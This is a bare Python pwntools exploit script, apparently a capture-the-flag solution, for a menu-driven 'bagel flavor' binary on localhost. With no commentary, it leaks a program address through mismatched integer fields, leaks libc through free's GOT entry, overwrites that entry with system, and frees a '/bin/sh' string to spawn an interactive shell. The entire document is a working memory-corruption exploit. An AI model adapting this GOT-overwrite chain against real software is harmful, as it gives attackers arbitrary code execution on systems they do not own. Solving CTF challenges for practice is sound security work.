from pwn import *
from Crypto.Util.number import long_to_bytes, bytes_to_long
exe = context.binary = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

HOST = 'localhost'
PORT = 3000

def twos_compliment(x):
    return long_to_bytes(0x100000000 + x)[-4:]

def get_proc():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process()

p = get_proc()
p.recvuntil(b'name: ')
p.sendline(b'6')
p.recvuntil(b'name: ')
p.sendline(b'asdasd')

p.recvuntil(b'=> ')
p.sendline(b'1')
p.recvuntil(b'flavor: ')
p.sendline(b'strawberry')

p.recvuntil(b'=> ')
p.sendline(b'4')
p.recvuntil(b'ID: ')
p.sendline(b'0')

p.recvuntil(b'=> ')
p.sendline(b'5')
p.recvuntil(b'age: ')
lower_bytes = twos_compliment(int(p.recvline().strip().decode().split(' ')[0]))
p.recvuntil(b'weight: ')
upper_bytes = twos_compliment(int(p.recvline().strip().decode().split(' ')[0]))
quote_addr = bytes_to_long(upper_bytes + lower_bytes)
exe.address = quote_addr - next(exe.search(b'Bagels take you to a place that'))

p.recvuntil(b'=> ')
p.sendline(b'6')
p.recvuntil(b'name: ')
p.sendline(b'7')
p.recvuntil(b'name: ')
p.sendline(p64(exe.got['free'])[:6] + b'\x00')

p.recvuntil(b'=> ')
p.sendline(b'2')
p.recvuntil(b'ID: ')
p.sendline(b'0')
p.recvuntil(b'Flavor: ')
free_addr = u64(p.recv(6) + b'\x00\x00')
libc.address = free_addr - libc.sym['free']

p.recvuntil(b'=> ')
p.sendline(b'3')
p.recvuntil(b'ID: ')
p.sendline(b'0')
p.recvuntil(b'flavor: ')
p.sendline(p64(libc.sym['system']) + p64(libc.sym['puts']))

p.recvuntil(b'=> ')
p.sendline(b'1')
p.recvuntil(b'flavor: ')
p.sendline(b'/bin/sh')

p.recvuntil(b'=> ')
p.sendline(b'4')
p.recvuntil(b'ID: ')
p.sendline(b'1')
p.interactive()
